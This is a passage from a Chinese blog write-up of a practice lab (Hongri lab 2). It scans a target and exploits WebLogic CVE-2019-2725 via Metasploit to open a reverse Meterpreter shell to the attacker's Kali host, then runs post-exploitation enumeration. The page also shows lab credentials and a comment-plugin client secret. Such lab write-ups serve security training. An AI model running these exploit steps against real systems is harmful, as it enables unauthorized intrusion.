<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="Hexo Theme Keep">
    <meta name="author" content="seconme">
    
    <title>
        
            红日靶场2-攻克记录 |
        
        ~是我呀
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    <link rel="shortcut icon" href="https://cdn.staticaly.com/gh/seconme/picx-images-hosting@master/favicon.3t5ap34gepy0.webp">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@3.6.1/source/font/css/regular.min.css">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@3.6.1/source/font/css/solid.min.css">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@3.6.1/source/font/css/brands.min.css">
    <script id="hexo-configurations">
    let KEEP = window.KEEP || {}
    KEEP.hexo_config = {"hostname":"seconme.github.io","root":"/","language":"zh-CN"}
    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066cc","logo":"/images/preview.webp","favicon":"https://cdn.staticaly.com/gh/seconme/picx-images-hosting@master/favicon.3t5ap34gepy0.webp","avatar":"https://cdn.staticaly.com/gh/seconme/picx-images-hosting@master/preview.1lbmi81cp8u8.webp","font_size":null,"font_family":null,"hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/bg.svg","description":"Lifetime Wandering","font_color":null,"hitokoto":false},"scroll":{"progress_bar":false,"percent":false}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"side_tools":{},"pjax":{"enable":false},"lazyload":{"enable":true},"comment":{"enable":true,"use":"gitalk","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":"seconme","github_admins":null,"repository":"hexo-blog-comments","client_id":"17efb64209824b16935b","client_secret":"2ceab4677a6e6b5ebd72a6d3207a6611b13b7e95","proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.8"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["炼气门徒","筑基弟子","金丹砥柱","元婴长老","化神门主","合道老祖","终于大乘"]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"left","copyright_info":true},"version":"3.6.1"}
    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
  </script>
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
<div class="progress-bar-container">
    

    
</div>


<main class="page-container">

    

    <div class="page-main-content">

        <div class="page-main-content-top">
            
<header class="header-wrapper">

    <div class="header-content">
        <div class="left">
            
                <a class="logo-image" href="/">
                    <img src="/images/preview.webp">
                </a>
            
            <a class="logo-title" href="/">
               ~是我呀
            </a>
        </div>

        <div class="right">
            <div class="pc">
                <ul class="menu-list">
                    
                        <li class="menu-item">
                            <a class=""
                               href="/"
                            >
                                首页
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/archives"
                            >
                                归档
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/categories"
                            >
                                分类
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/tags"
                            >
                                标签
                            </a>
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="fas fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/">首页</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/archives">归档</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/categories">分类</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/tags">标签</a>
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle">

            <div class="main-content">

                
                    <div class="fade-in-down-animation">
    <div class="post-page-container">
        <div class="article-content-container">

            <div class="article-title">
                <span class="title-hover-animation">红日靶场2-攻克记录</span>
            </div>

            
                <div class="article-header">
                    <div class="avatar">
                        <img src="https://cdn.staticaly.com/gh/seconme/picx-images-hosting@master/preview.1lbmi81cp8u8.webp">
                    </div>
                    <div class="info">
                        <div class="author">
                            <span class="name">seconme</span>
                            
                                <span class="author-label">Lv2</span>
                            
                        </div>
                        <div class="meta-info">
                            
<div class="article-meta-info">
    <span class="article-date article-meta-item">
        
            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
        
        <span class="pc">2023-05-19 13:02:42</span>
        <span class="mobile">2023-05-19 13:02</span>
    </span>
    
        <span class="article-update-date article-meta-item">
        <i class="fas fa-file-pen"></i>&nbsp;
        <span class="pc">2023-05-21 11:10:53</span>
    </span>
    
    
        <span class="article-categories article-meta-item">
            <i class="fas fa-folder"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/categories/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/">红日靶场</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fas fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/Weblogic/">Weblogic</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fas fa-file-word"></i>&nbsp;<span>4.2k 字</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fas fa-clock"></i>&nbsp;<span>20 分钟</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                        </div>
                    </div>
                </div>
            

            <div class="article-content keep-markdown-body">
                

                <h1 id="靶场准备"><a href="#靶场准备" class="headerlink" title="靶场准备"></a>靶场准备</h1><p>下载靶机，VMWare安装，配置网卡，这些过程不讲，有以下注意点：</p>
<ul>
<li>登录Web服务器要切换用户为<code>de1ay\de1ay</code></li>
<li>配置Web和PC两台机子时，需要管理员权限，使用账号密码：<code>administrator：1qaz@WSX</code></li>
</ul>
<p>网卡如何配置就不讲了。配置完成后，记得测试连通性。</p>
<p>我的靶场配置：</p>
<p>DC：10.10.10.10&#x2F;24<br>PC：10.10.10.201&#x2F;24，192.168.44.201&#x2F;24<br>Web：10.10.10.80&#x2F;24，192.168.44.80&#x2F;24<br>Kali：192.168.44.128&#x2F;24</p>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>这里略去收集Web主机真实IP的过程（没必要），我们已经知道Web服务器真实IP：192.168.44.80.</p>
<p>Web浏览器访问该IP 80端口，只有200响应码，其他什么也没有。所以使用工具进行端口扫描，</p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>直接进入MSF，再使用nmap</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">nmap -sV -sS -T4 192.168.44.80</span><br><span class="line"><span class="comment"># 扫描结果</span></span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-19 01:15 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.44.80</span><br><span class="line">Host is up (0.0015s latency).</span><br><span class="line">Not shown: 990 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE        VERSION</span><br><span class="line">80/tcp    open  http           Microsoft IIS httpd 7.5</span><br><span class="line">135/tcp   open  msrpc          Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds   Microsoft Windows Server 2008 R2 - 2012 microsoft-ds</span><br><span class="line">1433/tcp  open  ms-sql-s       Microsoft SQL Server 2008 R2 10.50.4000; SP2</span><br><span class="line">3389/tcp  open  ms-wbt-server?</span><br><span class="line">7001/tcp  open  http           Oracle WebLogic Server 10.3.6.0 (Servlet 2.5; JSP 2.1; T3 enabled)</span><br><span class="line">49152/tcp open  msrpc          Microsoft Windows RPC</span><br><span class="line">49153/tcp open  msrpc          Microsoft Windows RPC</span><br><span class="line">49154/tcp open  msrpc          Microsoft Windows RPC</span><br><span class="line">MAC Address: 00:0C:29:F3:86:F9 (VMware)</span><br><span class="line">Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 86.94 seconds</span><br></pre></td></tr></table></figure>
<p>可知：</p>
<ol>
<li>80端口，IIS httpd 7.5</li>
<li>135端口，MSRPC</li>
<li>445端口，可能存在永恒之蓝漏洞，MS-17-010.</li>
<li>1433端口，MSSQL服务，可能存在SQL注入&#x2F;SA弱口令漏洞；</li>
<li>3389端口，远程桌面服务，可能存在弱口令；</li>
<li>7001端口，WeblogicServer，可能存在反序列化，未授权访问等漏洞</li>
</ol>
<p>暂时不考虑永恒之蓝；135的漏洞需要知道账户口令，无法远程利用，1433端口，没有找到接口，无法利用；3389端口，不知道账户，无法利用。</p>
<h2 id="Web目录扫描"><a href="#Web目录扫描" class="headerlink" title="Web目录扫描"></a>Web目录扫描</h2><p>对于80和7001，可以先访问看看，访问结果是，找不到什么东西。所以目录扫描，我使用<code>dirsearch</code>，我使用pip安装dirsearch，安装后目录为<code>~/.local/bin/dirsearch</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pip install dirsearch</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> .<span class="built_in">local</span>/bin</span><br><span class="line"></span><br><span class="line">./dirsearch -u http://192.168.44.80:80</span><br><span class="line"><span class="comment"># 没有找到有效路径</span></span><br><span class="line"></span><br><span class="line">./dirsearch -u http://192.168.44.80:7001</span><br><span class="line"><span class="comment"># Weblogic存在一些有效路径，说明Weblogic是在服务的</span></span><br></pre></td></tr></table></figure>

<h2 id="Weblogic漏洞扫描"><a href="#Weblogic漏洞扫描" class="headerlink" title="Weblogic漏洞扫描"></a>Weblogic漏洞扫描</h2><p>使用WeblogicScan工具扫描Weblogic漏洞：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/dr0op/WeblogicScan.git</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> WeblogicScan</span><br><span class="line"></span><br><span class="line">python WeblogicScan.py 192.168.44.80 7001</span><br><span class="line">/home/kali/WeblogicScan/app/platform.py:8: SyntaxWarning: <span class="string">&quot;is&quot;</span> with a literal. Did you mean <span class="string">&quot;==&quot;</span>?</span><br><span class="line">  <span class="keyword">if</span> plugins is ():</span><br><span class="line"></span><br><span class="line">__        __   _     _             _        ____                                            </span><br><span class="line">\ \      / /__| |__ | | ___   __ _(_) ___  / ___|  ___ __ _ _ __                            </span><br><span class="line"> \ \ /\ / / _ \ <span class="string">&#x27;_ \| |/ _ \ / _` | |/ __| \___ \ / __/ _` | &#x27;</span>_ \                           </span><br><span class="line">  \ V  V /  __/ |_) | | (_) | (_| | | (__   ___) | (_| (_| | | | |                          </span><br><span class="line">   \_/\_/ \___|_.__/|_|\___/ \__, |_|\___| |____/ \___\__,_|_| |_|                          </span><br><span class="line">                             |___/                                                          </span><br><span class="line">      From WeblogicScan V1.2 Fixed by Ra1ndr0op: drops.org.cn | V 1.3.1                     </span><br><span class="line">                                                                                            </span><br><span class="line">Welcome To WeblogicScan !!</span><br><span class="line">[*]开始检测 weblogic-console</span><br><span class="line">[+]The target Weblogic console address is exposed!</span><br><span class="line">[+]The path is: http://192.168.44.80:7001/console/login/LoginForm.jsp                       </span><br><span class="line">[+]Please try weak password blasting!                                                       </span><br><span class="line">[+]Weblogic后台路径存在</span><br><span class="line">[*]开始检测 SSRF</span><br><span class="line">[+]The target Weblogic UDDI module is exposed!</span><br><span class="line">[+]The path is: http://192.168.44.80:7001/uddiexplorer/                                     </span><br><span class="line">[+]Please verify the SSRF vulnerability!                                                    </span><br><span class="line">[+]SSRF 漏洞存在</span><br><span class="line">[*]开始检测 CVE-2019-2725</span><br><span class="line">[+]The target weblogic has a JAVA deserialization vulnerability:CVE-2019-2725</span><br><span class="line">[+]CVE-2019-2725 漏洞存在</span><br><span class="line">[*]开始检测 CVE-2019-2729</span><br><span class="line">[-]CVE20192729 未成功检测，请检查网络连接或或目标存在负载中间件</span><br><span class="line">[*]开始检测 CVE-2017-10271</span><br><span class="line">[-]Target weblogic not detected CVE-2017-10271</span><br><span class="line">[*]开始检测 CVE-2017-3506</span><br><span class="line">[+]The target weblogic has a JAVA deserialization vulnerability:CVE-2017-3506</span><br><span class="line">[+]CVE-2017-3506 漏洞存在</span><br><span class="line">[*]开始检测 CVE20192618</span><br><span class="line">[-]口令爆破失败：weblogic/weblogic</span><br><span class="line">[-]口令爆破失败：weblogic/weblogic1</span><br><span class="line">[-]口令爆破失败：weblogic/weblogic10</span><br><span class="line">[-]口令爆破失败：weblogic/weblogic123</span><br><span class="line">[-]口令爆破失败：weblogic/Oracle@123</span><br><span class="line">[-]target Weblogic is not Vul CVE-2019-2618</span><br><span class="line">[*]开始检测 CVE20182894</span><br><span class="line">[-]Target weblogic not detected CVE-2018-2894</span><br><span class="line">[*]开始检测 CVE20182628</span><br><span class="line">[-]CVE20182628 未成功检测，请检查网络连接或或目标存在负载中间件</span><br><span class="line">[*]开始检测 CVE20182893</span><br><span class="line">[+]The target weblogic has a JAVA deserialization vulnerability:CVE-2018-2893</span><br><span class="line">[+]CVE-2018-2893 漏洞存在</span><br><span class="line">[*]开始检测 CVE20160638</span><br><span class="line">[-]Target weblogic not detected CVE-2016-0638</span><br><span class="line">[*]开始检测 CVE20163510</span><br><span class="line">[-]Target weblogic not detected CVE-2016-3510</span><br><span class="line">[*]开始检测 CVE20173248</span><br><span class="line">[-]Target weblogic not detected CVE-2017-3248</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>可能存在 SSRF、CVE-2019-2725、CVE-2017-3506、CVE-2018-2893。</p>
<p>这里优先看反序列化漏洞，因为可能可以直接拿到shell。</p>
<h2 id="Weblogic漏洞验证利用"><a href="#Weblogic漏洞验证利用" class="headerlink" title="Weblogic漏洞验证利用"></a>Weblogic漏洞验证利用</h2><p>MSF搜索相关CVE漏洞：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"># 或者 search weblogic，然后找相应时间的结果</span><br><span class="line">msf6 &gt; search CVE-2019-2725</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                                          Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                                          ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/multi/misc/weblogic_deserialize_asyncresponseservice  2019-04-23       excellent  Yes    Oracle Weblogic Server Deserialization RCE - AsyncResponseService                </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/misc/weblogic_deserialize_asyncresponseservice</span><br><span class="line"></span><br><span class="line">msf &gt; use 0</span><br><span class="line">[*] Using configured payload cmd/unix/reverse_bash</span><br><span class="line">msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/misc/weblogic_deserialize_asyncresponseservice):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting           Required  Description</span><br><span class="line">   ----       ---------------           --------  -----------</span><br><span class="line">   Proxies                              no        A proxy chain of format type:host:port[,</span><br><span class="line">                                                  type:host:port][...]</span><br><span class="line">   RHOSTS                               yes       The target host(s), see https://docs.met</span><br><span class="line">                                                  asploit.com/docs/using-metasploit/basics</span><br><span class="line">                                                  /using-metasploit.html</span><br><span class="line">   RPORT      7001                      yes       The target port (TCP)</span><br><span class="line">   SSL        false                     no        Negotiate SSL/TLS for outgoing connectio</span><br><span class="line">                                                  ns</span><br><span class="line">   TARGETURI  /_async/AsyncResponseSer  yes       URL to AsyncResponseService</span><br><span class="line">              vice</span><br><span class="line">   VHOST                                no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (cmd/unix/reverse_bash):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST                   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Unix</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d command.</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) &gt; set RHOSTS 192.168.44.80</span><br><span class="line">RHOSTS =&gt; 192.168.44.80</span><br><span class="line">msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) &gt; set LHOST 192.168.44.128</span><br><span class="line">LHOST =&gt; 192.168.44.128</span><br><span class="line">msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) &gt; set target 1 # 0 为UNIX，1 为Windows</span><br><span class="line">target =&gt; 1</span><br><span class="line">msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.44.128:4444 </span><br><span class="line">[*] Generating payload...</span><br><span class="line">[*] Sending payload...</span><br><span class="line">[*] Sending stage (175686 bytes) to 192.168.44.80</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.44.128:4444 -&gt; 192.168.44.80:62640) at 2023-05-19 00:32:26 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure>

<p>直接获得meterpreter。</p>
<h2 id="进一步信息收集（域）"><a href="#进一步信息收集（域）" class="headerlink" title="进一步信息收集（域）"></a>进一步信息收集（域）</h2><p>获得meterpreter后，搜集系统更详细的信息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"># 获取系统信息</span><br><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : WEB</span><br><span class="line">OS              : Windows 2008 R2 (6.1 Build 7601, Service Pack 1).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : zh_CN</span><br><span class="line">Domain          : DE1AY</span><br><span class="line">Logged On Users : 6</span><br><span class="line">Meterpreter     : x86/windows</span><br><span class="line"></span><br><span class="line"># 获取当前用户名称</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: DE1AY\Administrator</span><br><span class="line"></span><br><span class="line"># 列举已登录用户</span><br><span class="line">meterpreter &gt; run post/windows/gather/enum_logged_on_users</span><br><span class="line"></span><br><span class="line">[*] Running module against WEB (192.168.44.80)</span><br><span class="line"></span><br><span class="line">Current Logged Users</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line"> SID                                             User</span><br><span class="line"> ---                                             ----</span><br><span class="line"> S-1-5-21-2756371121-2868759905-3853650604-1001  DE1AY\de1ay</span><br><span class="line"> S-1-5-21-2756371121-2868759905-3853650604-2103  DE1AY\mssql</span><br><span class="line"> S-1-5-21-2756371121-2868759905-3853650604-500   DE1AY\Administrator</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Results saved in: /home/kali/.msf4/loot/20230519020219_default_192.168.44.80_host.users.activ_427545.txt</span><br><span class="line"></span><br><span class="line">Recently Logged Users</span><br><span class="line">=====================</span><br><span class="line"></span><br><span class="line"> SID                                             Profile Path</span><br><span class="line"> ---                                             ------------</span><br><span class="line"> S-1-5-18                                        C:\Windows\system32\config\systemprofile</span><br><span class="line"> S-1-5-19                                        C:\Windows\ServiceProfiles\LocalService</span><br><span class="line"> S-1-5-20                                        C:\Windows\ServiceProfiles\NetworkService</span><br><span class="line"> S-1-5-21-2756371121-2868759905-3853650604-1001  C:\Users\de1ay.DE1AY</span><br><span class="line"> S-1-5-21-2756371121-2868759905-3853650604-2103  C:\Users\mssql</span><br><span class="line"> S-1-5-21-2756371121-2868759905-3853650604-500   C:\Users\Administrator</span><br><span class="line"> S-1-5-21-3767205380-3469466069-2137393323-1000  C:\Users\de1ay</span><br><span class="line"> S-1-5-82-1036420768-1044797643-1061213386-2937  C:\Users\Classic .NET AppPool</span><br><span class="line"> 092688-4282445334</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 进入 cmd</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line"></span><br><span class="line">Process 2100 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [�汾 6.1.7601]</span><br><span class="line">��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����</span><br><span class="line"></span><br><span class="line"># 解决乱码问题</span><br><span class="line">C:\Oracle\Middleware\user_projects\domains\base_domain&gt;chcp 65001</span><br><span class="line">chcp 65001</span><br><span class="line">Active code page: 65001</span><br><span class="line"></span><br><span class="line">C:\Oracle\Middleware\user_projects\domains\base_domain&gt;net user /domain</span><br><span class="line">net user /domain</span><br><span class="line">The request will be processed at a domain controller for domain de1ay.com.</span><br><span class="line"></span><br><span class="line">System error 5 has occurred.</span><br><span class="line"></span><br><span class="line">Access is denied.</span><br><span class="line"></span><br><span class="line">C:\Oracle\Middleware\user_projects\domains\base_domain&gt;ipconfig /all</span><br><span class="line"></span><br><span class="line">Windows IP Configuration</span><br><span class="line"></span><br><span class="line">   Host Name . . . . . . . . . . . . : WEB</span><br><span class="line">   Primary Dns Suffix  . . . . . . . : de1ay.com</span><br><span class="line">   Node Type . . . . . . . . . . . . : Hybrid</span><br><span class="line">   IP Routing Enabled. . . . . . . . : No</span><br><span class="line">   WINS Proxy Enabled. . . . . . . . : No</span><br><span class="line">   DNS Suffix Search List. . . . . . : de1ay.com</span><br><span class="line"></span><br><span class="line">Ethernet adapter �������� 2:</span><br><span class="line"></span><br><span class="line">   Connection-specific DNS Suffix  . : </span><br><span class="line">   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection #2</span><br><span class="line">   Physical Address. . . . . . . . . : 00-0C-29-F3-86-03</span><br><span class="line">   DHCP Enabled. . . . . . . . . . . : No</span><br><span class="line">   Autoconfiguration Enabled . . . . : Yes</span><br><span class="line">   Link-local IPv6 Address . . . . . : 